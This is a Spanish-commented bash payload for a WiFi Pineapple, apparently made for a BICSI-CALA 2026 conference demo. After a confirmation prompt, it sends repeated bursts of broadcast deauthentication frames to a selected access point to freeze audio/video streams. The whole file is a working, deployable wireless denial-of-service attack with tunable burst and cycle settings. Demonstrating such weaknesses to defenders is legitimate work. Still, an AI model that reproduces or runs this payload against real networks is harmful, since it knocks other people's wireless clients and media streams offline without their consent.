#!/bin/bash
# Title: AV Demo — DoS de Stream AV
# Description: Deauth cíclico contra red AV para demostrar denegación de servicio en flujo de audio/video
# Author: BICSI-CALA 2026 Demo
# Version: 1.0
# Category: recon/access_point
#
# Context: recon/access_point — variables $_RECON_SELECTED_AP_* available
# Deploy to: /mmc/root/payloads/recon/access_point/av_dos_attack/

CYCLE_COUNT=3           # Ciclos ataque/recuperación
ATTACK_DURATION=10      # Segundos de deauth sostenido
RECOVERY_DURATION=10    # Segundos de pausa entre ciclos
BURST_COUNT=30          # Paquetes deauth por ráfaga
BURST_INTERVAL=0.1      # Segundos entre frames deauth
BURST_PAUSE=1           # Segundos entre ráfagas

# ─── Show target info ─────────────────────────────────────────────────────────
LOG ""
LOG "=== AV DoS — DENEGACIÓN DE SERVICIO ==="
LOG ""
LOG "Target AP:"
LOG "  SSID:    $_RECON_SELECTED_AP_SSID"
LOG "  BSSID:   $_RECON_SELECTED_AP_BSSID"
LOG "  Channel: $_RECON_SELECTED_AP_CHANNEL"
LOG "  Clients: $_RECON_SELECTED_AP_CLIENT_COUNT"
LOG "  Encrypt: $_RECON_SELECTED_AP_ENCRYPTION_TYPE"
LOG ""

# ─── Confirm attack ───────────────────────────────────────────────────────────
resp=$(CONFIRMATION_DIALOG "ATACAR STREAM AV?\n\nSSID: $_RECON_SELECTED_AP_SSID\nBSSID: $_RECON_SELECTED_AP_BSSID\nCanal: $_RECON_SELECTED_AP_CHANNEL\n\n$CYCLE_COUNT ciclos de ${ATTACK_DURATION}s ataque / ${RECOVERY_DURATION}s pausa\nEl stream se congelará durante cada ciclo de ataque.")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Cancelado."
        exit 0
        ;;
esac

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "Cancelado por el usuario."
    exit 0
fi

# ─── Attack cycles ─────────────────────────────────────────────────────────────
total_frames=0
cycle=1

while [ $cycle -le $CYCLE_COUNT ]; do
    LOG ""
    LOG "=== CICLO $cycle/$CYCLE_COUNT — ATAQUE ==="
    LOG ""

    # ─── ATAQUE: deauth sostenido por tiempo ─────────────────────────────────
    LED RED
    VIBRATE

    LOG red "Deauth activo — stream congelado"
    LOG "  Duración: ${ATTACK_DURATION}s | Ráfagas de $BURST_COUNT paquetes"

    start_time=$(date +%s)
    cycle_frames=0

    while true; do
        now=$(date +%s)
        elapsed=$((now - start_time))
        [ $elapsed -ge $ATTACK_DURATION ] && break

        # Enviar ráfaga de deauth broadcast
        i=0
        while [ $i -lt $BURST_COUNT ]; do
            PINEAPPLE_DEAUTH_CLIENT "$_RECON_SELECTED_AP_BSSID" "FF:FF:FF:FF:FF:FF" "$_RECON_SELECTED_AP_CHANNEL"
            i=$((i + 1))
            sleep $BURST_INTERVAL
        done

        cycle_frames=$((cycle_frames + BURST_COUNT))
        sleep $BURST_PAUSE
    done

    total_frames=$((total_frames + cycle_frames))
    LOG "  Ráfaga completada: $cycle_frames frames enviados"

    # ─── RECUPERACIÓN (excepto último ciclo) ─────────────────────────────────
    if [ $cycle -lt $CYCLE_COUNT ]; then
        LED GREEN
        VIBRATE

        LOG ""
        LOG green "=== CICLO $cycle/$CYCLE_COUNT — RECUPERACIÓN ==="
        LOG green "Stream reconectando... (${RECOVERY_DURATION}s)"
        LOG ""

        sleep $RECOVERY_DURATION
    fi

    cycle=$((cycle + 1))
done

# ─── Fin ───────────────────────────────────────────────────────────────────────
LED WHITE
VIBRATE

LOG ""
LOG "=== DEMO COMPLETADO ==="
LOG ""
LOG green "Resumen:"
LOG green "  Ciclos: $CYCLE_COUNT"
LOG green "  Frames deauth enviados: $total_frames"
LOG green "  Target: $_RECON_SELECTED_AP_SSID"
LOG ""

ALERT "DoS COMPLETADO\n\n$CYCLE_COUNT ciclos\n$total_frames frames deauth\nTarget: $_RECON_SELECTED_AP_SSID"

exit 0
